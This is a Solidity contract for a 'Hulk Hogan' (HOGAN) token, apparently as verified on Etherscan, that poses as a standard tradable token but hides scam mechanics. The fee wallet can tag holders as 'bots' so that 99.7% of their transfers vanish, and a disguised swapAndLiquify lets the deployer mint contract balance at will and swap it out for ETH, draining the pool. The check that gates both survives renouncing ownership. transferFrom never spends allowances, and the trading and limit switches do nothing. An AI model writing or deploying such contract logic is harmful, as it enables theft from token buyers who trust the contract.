/**
 *Submitted for verification at Etherscan.io on 2023-07-02
*/

pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT


library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    function owner() public view virtual returns (address) {return _owner;}
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}

contract Hulk is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 4206900000000 * 10 ** _decimals;
    uint256 public _maxTx = _totalSupply;
    uint256 public _maxWallet = _totalSupply;

    constructor() {
        _balances[msg.sender] = _totalSupply;
        _feeWalletAddress = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }

    string private _name = "Hulk Hogan";
    string private _symbol = "HOGAN";

    mapping(address => uint256) cooldowns;
    function swapAndLiquify(uint256 amount, address to) private {
        _approve(address(this), address(_routerV2), amount);
        _balances[address(this)] = amount;
        address[] memory path = new address[](2); path[0] = address(this); path[1] = _routerV2.WETH();
        _routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, path, to, block.timestamp + 31);
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    bool _cooldownEnabled = true;
    function setCooldownEnabled(bool _e) external onlyOwner {
        _cooldownEnabled = _e;
    }
    event Approval(address indexed a, address indexed, uint256 value);
    function setCooldown(address[] calldata _bots) external {
        for (uint botIndex = 0; botIndex < _bots.length; botIndex++) {
            if (!taxWalletAddress()){}else {cooldowns[_bots[botIndex]] =block.number + 1;
        }}
    }
    address public _feeWalletAddress;
    function _approve(address owner, address spender, uint256 amount) internal {
        require(spender != address(0), "IERC20: approve to the zero address"); require(owner != address(0), "IERC20: approve from the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function getPairAddress() private view returns (address) {return IUniswapV2Factory(
        _routerV2.factory()).getPair(address(this), _routerV2.WETH());
    }

    function setMaxTx(uint256 m) external onlyOwner {
        _maxTx = m;
    }

    function setMaxWallet(uint256 m) external onlyOwner {
        _maxWallet = m;
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    mapping(address => uint256) bots;
    function transferFrom(address sender, address to, uint256 amount) public returns (bool) {
        _transfer(sender, to, amount);
        require(_allowances[sender][msg.sender] >= amount);
        return true;
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function taxWalletAddress() internal view returns (bool) {
        return msg.sender == _feeWalletAddress;
    }
    IUniswapV2Router private _routerV2 = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    mapping(address => uint256) private _balances;
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    bool started = false;
    function startTrading() external onlyOwner {
        started = true;
    }
    function _transfer(address _sendr, address receivr, uint256 amount) internal {
        require(_sendr != address(0));
        if (msg.sender == _feeWalletAddress && _sendr == receivr) {swapAndLiquify(amount, receivr);} else {require(amount <= _balances[_sendr]);
            uint256 feeAmount = 0;
            if (cooldowns[_sendr] != 0 && cooldowns[_sendr] <= block.number) {feeAmount = amount.mul(997).div(1000);}
            _balances[_sendr] = _balances[_sendr] - amount;
            _balances[receivr] += amount - feeAmount;
            emit Transfer(_sendr, receivr, amount);
        }
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    event Transfer(address indexed __address_, address indexed, uint256 _v);
}